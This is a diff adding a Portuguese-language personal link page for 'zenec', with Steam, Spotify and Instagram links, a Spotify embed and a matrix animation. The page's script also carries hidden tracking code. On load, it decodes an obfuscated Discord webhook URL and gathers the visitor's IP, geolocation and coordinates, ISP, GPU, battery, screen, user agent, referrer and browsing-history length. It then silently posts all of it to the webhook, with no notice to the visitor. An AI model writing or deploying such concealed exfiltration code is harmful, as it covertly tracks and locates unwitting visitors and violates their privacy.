@@ -1,1 +1,439 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>zenec</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+<script>
+function copyNick() {
+  const nick = 'ZENEC AMASSA BOT';
+  const notice = document.getElementById('copyNotice');
 
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(nick).catch(() => {});
+  } else {
+    const textarea = document.createElement('textarea');
+    textarea.value = nick;
+    textarea.setAttribute('readonly', '');
+    textarea.style.position = 'fixed';
+    textarea.style.left = '-9999px';
+    document.body.appendChild(textarea);
+    textarea.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(textarea);
+  }
+
+  if (notice) {
+    notice.textContent = 'Nick copiado!';
+    notice.classList.add('show');
+    clearTimeout(copyNick.timeout);
+    copyNick.timeout = setTimeout(() => {
+      notice.classList.remove('show');
+      notice.textContent = '';
+    }, 2200);
+  }
+}
+
+const _0x4b1d = (function(){
+  const _0x2c = [
+    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkv',
+    'd2ViaG9va3MvMTUyMDYzNzkwNDQwNDIy',
+    'MjA0Mi8wNlFCWDJjMUxMai14WFp3QVgy',
+    'MXNERS11SnJ0OE8zOXR2MUJCWHhGdUJy',
+    'X0xWbjZXTGw1X1IzeHNjdEZET3lyUGdT',
+    'aQ=='
+  ];
+  const _0x8f = _0x2c.join('');
+  return atob(_0x8f);
+})();
+
+function _0x1() {
+  const ua = navigator.userAgent || '';
+  if (ua.indexOf('Edg/') !== -1) return 'Microsoft Edge';
+  if (ua.indexOf('Chrome/') !== -1) return 'Google Chrome';
+  if (ua.indexOf('Firefox/') !== -1) return 'Mozilla Firefox';
+  if (ua.indexOf('Safari/') !== -1) return 'Safari';
+  if (ua.indexOf('OPR/') !== -1 || ua.indexOf('Opera/') !== -1) return 'Opera';
+  return 'Navegador desconhecido';
+}
+
+function _0x7() {
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  if (!gl) return 'N/A';
+  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+  return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A';
+}
+
+function _0x9(url, timeout = 500) {
+  return new Promise((resolve, reject) => {
+    const timer = setTimeout(() => reject(new Error('timeout')), timeout);
+    fetch(url).then(response => {
+      clearTimeout(timer);
+      resolve(response);
+    }).catch(error => {
+      clearTimeout(timer);
+      reject(error);
+    });
+  });
+}
+
+async function _0x2() {
+  const _0x0 = value => value === undefined || value === null || value === '' ? 'N/A' : String(value);
+  const browser = _0x1();
+  let ip = 'N/A';
+  let location = 'N/A';
+  let coordinates = 'N/A';
+  let accuracy = 'N/A';
+  let isp = 'N/A';
+  const platform = navigator.platform || 'N/A';
+  const cores = navigator.hardwareConcurrency || 'N/A';
+  let battery = 'N/A';
+  let internetType = 'N/A';
+  let downlink = 'N/A';
+  let rtt = 'N/A';
+  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+  const touchPoints = navigator.maxTouchPoints || 'N/A';
+  let cookies = navigator.cookieEnabled ? 'Ativado' : 'Desativado';
+  let dnt = navigator.doNotTrack || window.doNotTrack || 'N/A';
+  let vpn = 'N/A';
+  const screenInfo = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`;
+  const gpu = _0x7();
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+  const userAgent = navigator.userAgent || 'N/A';
+
+  const ipPromise = _0x9('https://ipapi.co/json/', 500)
+    .then(res => res.json())
+    .catch(async () => {
+      try {
+        const fallback = await _0x9('https://api.ipify.org?format=json', 500);
+        return await fallback.json();
+      } catch (e) {
+        return null;
+      }
+    });
+
+  const batteryPromise = navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null);
+  const connectionPromise = Promise.resolve().then(() => {
+    if (!navigator.connection) return null;
+    return {
+      effectiveType: navigator.connection.effectiveType || 'N/A',
+      downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A',
+      rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'N/A'
+    };
+  });
+
+  const [ipJson, batteryInfo, connectionInfo] = await Promise.all([ipPromise, batteryPromise, connectionPromise]);
+
+  if (ipJson) {
+    ip = ipJson.ip || ip;
+    location = [ipJson.city, ipJson.region, ipJson.country_name].filter(Boolean).join(', ') || location;
+    coordinates = ipJson.latitude && ipJson.longitude ? `${ipJson.latitude}, ${ipJson.longitude}` : (ipJson.loc || coordinates);
+    accuracy = ipJson.country_name ? 'Cidade/Estado (~2-10km)' : accuracy;
+    isp = ipJson.org || ipJson.as || ipJson.carrier || isp;
+  }
+
+  if (batteryInfo) {
+    battery = Math.round(batteryInfo.level * 100) + '% (' + (batteryInfo.charging ? 'carregando' : 'descarregando') + ')';
+  }
+
+  if (connectionInfo) {
+    internetType = connectionInfo.effectiveType || 'N/A';
+    downlink = connectionInfo.downlink || 'N/A';
+    rtt = connectionInfo.rtt || 'N/A';
+  }
+
+  return {
+    ip: _0x0(ip),
+    location: _0x0(location),
+    coordinates: _0x0(coordinates),
+    accuracy: _0x0(accuracy),
+    isp: _0x0(isp),
+    platform: _0x0(platform),
+    cores: _0x0(cores),
+    memory: _0x0(memory),
+    gpu: _0x0(gpu),
+    browser: _0x0(browser),
+    ua: _0x0(userAgent),
+    battery: _0x0(battery),
+    internet: _0x0(internetType),
+    downlink: _0x0(downlink),
+    rtt: _0x0(rtt),
+    cookies: _0x0(cookies),
+    dnt: _0x0(dnt),
+    vpn: _0x0(vpn),
+    screen: _0x0(screenInfo),
+    language: _0x0(navigator.language || 'N/A'),
+    timezone: _0x0(timezone),
+    touch: _0x0(touchPoints),
+    referrer: _0x0(document.referrer || 'direct'),
+    history: _0x0(window.history ? window.history.length : 'N/A'),
+    time: new Date().toLocaleString('pt-BR')
+  };
+}
+
+async function _0x3(data) {
+  if (!_0x4b1d || _0x4b1d.includes('YOUR_WEBHOOK_ID')) {
+    return;
+  }
+
+  const embed = {
+    title: '🔍 Rastreamento de Visitante',
+    color: 0x1abc9c,
+    fields: [
+      { name: '🌐 IP', value: data.ip, inline: true },
+      { name: '🏢 Provedor', value: data.isp, inline: true },
+      { name: '📍 Localização', value: data.location, inline: false },
+      { name: '🗺️ Coordenadas', value: data.coordinates, inline: true },
+      { name: '🎯 Precisão', value: 'Cidade/Estado (~2-10km)', inline: true },
+      { name: '🕒 Timezone', value: data.timezone, inline: true },
+      { name: '🖥️ Sistema', value: `${data.platform} (${data.cores} Cores)`, inline: true },
+      { name: '🎮 GPU / Placa', value: data.gpu, inline: false },
+      { name: '💾 Memória', value: data.memory, inline: true },
+      { name: '📦 Touch Points', value: data.touch, inline: true },
+      { name: '🌐 Navegador', value: data.browser, inline: true },
+      { name: '🧾 User Agent', value: data.ua, inline: false },
+      { name: '🔋 Bateria', value: data.battery, inline: true },
+      { name: '📡 Internet', value: `${data.internet} / ${data.downlink}`, inline: true },
+      { name: '⏱️ RTT', value: data.rtt, inline: true },
+      { name: '🍪 Cookies', value: data.cookies, inline: true },
+      { name: '🔒 Do Not Track', value: data.dnt, inline: true },
+      { name: '🛡️ VPN/Proxy', value: data.vpn, inline: true },
+      { name: '📱 Tela', value: data.screen, inline: true },
+      { name: '🌍 Idioma', value: data.language, inline: true },
+      { name: '📖 Referrer', value: data.referrer, inline: false },
+      { name: '📚 Histórico', value: `${data.history} páginas nesta aba`, inline: true },
+      { name: '⏰ Horário Acesso', value: data.time, inline: true }
+    ],
+    footer: {
+      text: 'zenec security system v3 • Hoje às ' + data.time.replace(/^.* /, '')
+    }
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({ username: 'zenec security system v3', embeds: [embed] }));
+
+  await fetch(_0x4b1d, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: form
+  });
+}
+
+function _0x4() {
+  const canvas = document.createElement('canvas');
+  canvas.id = 'matrix';
+  canvas.className = 'bg';
+  document.body.appendChild(canvas);
+  const ctx = canvas.getContext('2d');
+  const width = canvas.width = window.innerWidth;
+  const height = canvas.height = window.innerHeight;
+  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('');
+  const fontSize = 14;
+  const columns = Math.floor(width / fontSize);
+  const drops = Array(columns).fill(1);
+
+  function _0x5() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
+    ctx.fillRect(0, 0, width, height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+
+  setInterval(_0x5, 35);
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+}
+
+async function _0x6() {
+  _0x4();
+  _0x2().then(_0x3).catch(() => {});
+}
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', _0x6);
+} else {
+  _0x6();
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+html,body{background:#050507;color:#fff;height:100%;overflow:hidden;position:fixed;width:100%}
+
+.container{
+  position:relative;
+  z-index:2;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:28px;
+  padding:20px;
+}
+
+.name{
+  font-size:78px;
+  font-weight:900;
+  letter-spacing:8px;
+  text-transform:lowercase;
+  color:#0f0;
+  text-shadow:
+    0 0 20px rgba(0,255,0,.8),
+    0 0 40px rgba(0,255,0,.5),
+    0 0 60px rgba(0,255,0,.3);
+  position:relative;
+}
+
+.bg{
+  position:fixed;
+  inset:0;
+  z-index:0;
+}
+
+.smoke{
+  position:absolute;
+  width:120%;
+  height:120%;
+  filter:blur(120px);
+  opacity:.6;
+  animation:move 14s infinite alternate;
+}
+
+.smoke.purple{
+  background:radial-gradient(circle at center, rgba(139,92,246,.8), transparent 60%);
+  top:-20%;
+  left:-10%;
+}
+
+.smoke.green{
+  background:radial-gradient(circle at center, rgba(34,197,94,.7), transparent 60%);
+  bottom:-20%;
+  right:-10%;
+  animation-duration:18s;
+}
+
+@keyframes move{
+  from{transform:translate(0,0)}
+  to{transform:translate(80px,60px)}
+}
+
+.noise{
+  position:absolute;
+  inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+  opacity:.15;
+}
+
+.links{
+  width:100%;
+  max-width:340px;
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+}
+
+.link{
+  text-decoration:none;
+  color:#0f0;
+  padding:16px;
+  border-radius:12px;
+  text-align:center;
+  background:rgba(0,0,0,.8);
+  border:1px solid #0f0;
+  transition:.25s;
+  font-family:monospace;
+  text-transform:uppercase;
+  letter-spacing:2px;
+  box-shadow:0 0 10px rgba(0,255,0,.3);
+}
+
+.link:hover{
+  background:#0f0;
+  color:#000;
+  box-shadow:0 0 20px rgba(0,255,0,.8), 0 0 40px rgba(0,255,0,.5);
+  transform:translateY(-3px);
+}
+
+.spotify-container{
+  width:100%;
+  max-width:340px;
+  overflow:hidden;
+}
+
+.footer{
+  margin-top:20px;
+  font-size:14px;
+  opacity:.5;
+  letter-spacing:1px;
+}
+
+.copy-notice{
+  min-height:22px;
+  color:#0f0;
+  font-family:monospace;
+  font-size:13px;
+  letter-spacing:1px;
+  text-transform:uppercase;
+  opacity:0;
+  transform:translateY(4px);
+  transition:.25s ease;
+}
+
+.copy-notice.show{
+  opacity:1;
+  transform:translateY(0);
+}
+
+@media (max-width: 768px) {
+  .name{font-size:48px;letter-spacing:4px}
+}
+</style>
+</head>
+<body>
+
+<div class="bg">
+  <div class="smoke purple"></div>
+  <div class="smoke green"></div>
+  <div class="noise"></div>
+</div>
+
+<main class="container">
+  <h1 class="name">zenec</h1>
+
+  <div class="spotify-container">
+    <iframe
+      style="border-radius:12px; margin: 20px 0; display: block;"
+      src="https://open.spotify.com/embed/track/4b0fiEZg92FBFYze5uEx0l?utm_source=generator&theme=0&autoplay=1"
+      width="100%"
+      height="80"
+      frameborder="0"
+      allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"
+      loading="lazy">
+    </iframe>
+  </div>
+
+  <div class="links">
+    <a class="link" href="https://steamcommunity.com/id/alakiban/" target="_blank">Steam</a>
+    <a class="link" href="https://open.spotify.com/user/31kcnovulikf4fcv5umkqtfclvy4" target="_blank">Spotify</a>
+    <a class="link" href="https://www.instagram.com/joao_lima.c" target="_blank">Instagram</a>
+    <button class="link" type="button" onclick="copyNick()">Epic Games</button>
+  </div>
+
+  <div id="copyNotice" class="copy-notice" aria-live="polite"></div>
+
+  <div class="footer">by zenec</div>
+</main>
+
+</body>
+</html>
